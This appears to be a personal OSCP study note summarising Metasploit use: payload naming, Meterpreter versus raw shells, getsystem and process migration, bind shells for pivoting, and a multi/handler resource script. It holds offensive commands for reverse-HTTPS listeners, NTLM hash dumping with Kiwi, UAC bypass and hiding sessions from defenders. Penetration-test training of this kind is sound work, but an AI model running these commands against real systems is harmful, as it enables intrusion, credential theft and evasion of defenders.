---
title: "Metasploit — Mental Model and Payload Selection"
created: "2026-04-05"
type: permanent-note
status: active
tags:
  - permanent-note
  - metasploit
  - meterpreter
  - msfvenom
  - post-exploitation
  - methodology
  - oscp
---

# Metasploit — Mental Model and Payload Selection

**Core idea:** Metasploit is not a magic button — it's a structured framework with predictable logic. The two decisions that matter most are: (1) staged vs non-staged, and (2) Meterpreter vs raw shell. Get those right and the rest is syntax.

---

## The Staged vs Non-Staged Decision

The notation is the key: **forward slash = staged, underscore = non-staged** in the final component of a payload name.

```
windows/x64/shell_reverse_tcp     ← NON-staged (underscore at end)
windows/x64/shell/reverse_tcp     ← STAGED (slash before reverse_tcp)
```

**Use non-staged when:** buffer has room, stability matters, Netcat is your listener.

**Use staged when:** exploit has tight space constraints (~38 bytes for stage 1). But staged requires `multi/handler` — Netcat cannot complete the staging handshake.

**The rule:** If your listener is Netcat, use non-staged. If your listener is `multi/handler`, use either.

---

## Meterpreter vs Raw Shell — When to Use Which

| Situation | Choose |
|-----------|--------|
| Initial foothold, AV unknown | Raw TCP shell first |
| AV disabled, need post-exploitation | Meterpreter |
| Need file transfer | Meterpreter (download/upload built-in) |
| Need to pivot | Meterpreter (route add, portfwd) |
| Need NTLM hashes | Meterpreter + Kiwi (load kiwi → creds_msv) |
| Need UAC bypass | Meterpreter + bypassuac_sdclt module |
| Evading network monitoring | meterpreter_reverse_https (looks like HTTPS) |

**Why raw shell first:** Meterpreter is well-known and AV detection rates are high. A raw TCP shell is less distinctive. Get in clean, disable AV, then upgrade to Meterpreter.

---

## The getsystem + migrate Pattern

This is the standard Windows post-exploitation workflow once you have a Meterpreter session:

```
1. Confirm SeImpersonatePrivilege is Enabled (whoami /priv in shell)
2. getsystem                    → elevates to SYSTEM via Named Pipe Impersonation
3. ps                           → find a stable, legitimate process
4. migrate <PID>                → move payload into that process (e.g., OneDrive.exe)
5. met.exe disappears           → defenders won't see the suspicious process name
```

**Why migrate matters:** Your payload lives in whatever process ran the binary. If that process exits, your session dies. Migrating into a long-lived system process (OneDrive, explorer, spoolsv) keeps your session alive and hides it from defenders scanning the process list.

---

## The bind_tcp Rule for Pivoting

When pivoting through Metasploit routes, **always use bind shell payloads** on the internal target:

```
route add 172.16.5.0/24 1          # route to internal network via session 1
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/bind_tcp    ← correct
# NOT meterpreter/reverse_tcp                   ← wrong
```

**Why:** A route only handles outbound connections from Kali through the pivot. A reverse shell payload on the internal target would try to connect back to Kali — but that machine has no route defined for Kali's IP and the connection fails. A bind shell waits for Kali to connect inbound through the established route.

---

## The multi/handler + Resource Script Pattern

For repeated engagements, never set up listeners manually:

```bash
# listener.rc
use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST YOUR_IP
set LPORT 443
set AutoRunScript post/windows/manage/migrate   # auto-migrate on session create
set ExitOnSession false                          # stay alive after first session
run -z -j                                        # background + no auto-interact

msfconsole -q -r listener.rc                    # launch with script
```

**The `ExitOnSession false` insight:** By default, `multi/handler` exits after the first session. On a real pentest where you're sending payloads to multiple targets, you want the listener to keep running. Always set this.

---

## Connections

- [[PWK-Module-20-Metasploit-Framework]] — full module with all commands and walkthroughs
- [[Pivoting-Mental-Model]] — manual pivoting concepts; Metasploit automates the same patterns
- [[Windows-PrivEsc-Decision-Tree]] — getsystem is the Metasploit wrapper for SeImpersonatePrivilege attacks
- [[Password-Cracking-Methodology]] — NTLM hashes from Kiwi feed into hashcat for cracking

---

*From: PWK Module 20*
